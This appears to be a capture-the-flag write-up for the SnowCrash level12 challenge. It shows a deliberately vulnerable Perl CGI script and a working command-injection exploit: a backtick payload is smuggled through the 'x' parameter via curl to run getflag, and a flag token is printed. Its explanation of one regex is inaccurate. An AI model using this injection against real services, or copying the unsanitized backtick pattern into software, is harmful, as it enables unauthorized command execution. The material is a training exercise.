### Level12

Let's start by looking at the available script:
```
level12@SnowCrash:~$ cat level12.pl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/;
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }
}

n(t(param("x"), param("y")));
```

We can observe 3 things:
- The script listens on port 4646
- It takes 2 parameters but only the first "x" is used
- x" is modified via regexes: 
	- `tr/a-z/A-Z/` will capitalize "x
	- `s/\s.*//;` the argument must start with a whitespace characters and be followed by characters

Let's start by creating a script to run the `getflag` command in a file:

`echo "getflag > /tmp/test" > /tmp/EXPLOIT`

Then let's do the following test, replacing `/tmp` with `*` so that we don't have to worry about regex :
```
level12@SnowCrash:~$ curl '10.181.11.61:4646?x="`/*/EXPLOIT`"'
..level12@SnowCrash:~$ cat /tmp/test
cat: /tmp/test: No such file or directory
```

Our test file was not created, so the command did not work. And indeed after running the script directly we can see this:
```
level12@SnowCrash:~$ ./level12.pl x="`/*/EXPLOIT`"
-bash: /tmp/EXPLOIT: Permission denied
Content-type: text/html

..level12@SnowCrash:~$
```

We then just need to change the permissions of `EXPLOIT` with a chmod. If we run the commands again we can see that it works:
```
level12@SnowCrash:~$ chmod 777 /tmp/EXPLOIT
level12@SnowCrash:~$ curl '10.181.11.61:4646?x="`/*/EXPLOIT`"'
..level12@SnowCrash:~$ cat /tmp/test
Check flag.here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```
